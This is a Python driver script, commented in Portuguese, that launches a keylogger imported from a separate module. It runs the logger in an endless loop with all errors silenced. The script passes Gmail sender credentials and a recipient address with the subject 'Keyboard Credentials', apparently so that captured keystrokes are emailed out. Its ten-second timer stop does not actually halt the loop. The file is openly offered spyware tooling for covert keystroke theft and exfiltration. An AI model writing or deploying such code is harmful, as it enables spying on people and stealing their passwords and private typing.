from threading import Timer
from keylogger import iniciar_keylogger

def executar_arquivo(remetente_email, remetente_senha, destinatario_email, subject):
    while True:
        try:
            print("#####Executando arquivos pendentes#####\n")
            timer = Timer(10, interromper_keylogger)  # Define um timer para interromper após 10 segundos
            timer.start()  # Inicia o timer
        except KeyboardInterrupt:
            print("Encerrando a execução do arquivo.")
        try:
            iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject)
        except Exception:
            pass  # Ignora todas as exceções

def interromper_keylogger():
    try:
        print("#####Interrompendo a execução. #####")
        raise KeyboardInterrupt  # Lança uma exceção KeyboardInterrupt para interromper a execução do keylogger
    except (Exception, KeyboardInterrupt):
        print("\n#####Encerrando todos os processos...#####\n")

if __name__ == "__main__":
    remetente_email = "seu_email@gmail.com"  # Substitua pelo seu e-mail
    remetente_senha = "senha_de_token_para_app"  # Substitua pela sua senha de e-mail
    destinatario_email = "Email_de_destino@gmail.com"  # Substitua pelo endereço de e-mail do destinatário
    subject = "Keyboard Credentials"

    print("Sendo executado agora...")

    # Iniciar a execução do keylogger.py
    executar_arquivo(remetente_email, remetente_senha, destinatario_email, subject)

    print("Encerrou após 10 segundos.")
